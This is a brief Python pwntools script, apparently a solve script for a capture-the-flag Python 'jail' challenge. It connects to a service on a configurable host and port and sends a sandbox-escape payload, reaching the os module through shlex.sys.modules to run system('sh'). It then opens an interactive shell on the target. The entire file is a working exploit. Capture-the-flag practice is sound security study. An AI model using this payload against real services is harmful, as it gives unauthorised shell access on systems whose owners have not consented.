import os
from pwn import *

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "1337"))

io = remote(HOST, PORT)

io.sendlineafter(b"jail >", b'shlex.sys.modules["os"].system("sh")')

io.interactive()